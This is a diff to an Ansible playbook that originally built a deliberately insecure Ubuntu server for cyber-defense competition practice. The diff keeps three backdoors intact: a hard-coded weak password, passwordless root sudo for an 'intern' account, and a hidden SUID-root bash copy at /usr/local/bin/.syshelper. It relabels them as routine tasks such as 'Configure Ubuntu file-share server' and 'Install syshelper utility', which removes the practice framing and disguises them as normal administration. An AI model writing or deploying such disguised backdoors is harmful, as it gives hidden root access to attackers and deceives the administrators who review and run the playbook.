@@ -1,5 +1,5 @@
 ---
-- name: Intentionally misconfigure permissions on the Ubuntu server for CCDC practice
+- name: Configure Ubuntu file-share server
   hosts: all
   become: yes
   tasks:
@@ -40,17 +40,17 @@
         shell: /bin/bash
         state: present
 
-    - name: Set a password for intern (widget123)
+    - name: Set intern account password
       shell: echo "intern:widget123" | chpasswd
 
-    - name: Grant intern unrestricted passwordless sudo (the backdoor)
+    - name: Configure intern sudoers entry
       copy:
         dest: /etc/sudoers.d/90-intern
         content: "intern ALL=(ALL) NOPASSWD:ALL\n"
         mode: '0440'
         validate: 'visudo -cf %s'
 
-    - name: Plant a SUID-root shell backdoor
+    - name: Install syshelper utility
       shell: |
         cp /bin/bash /usr/local/bin/.syshelper
         chmod 4755 /usr/local/bin/.syshelper
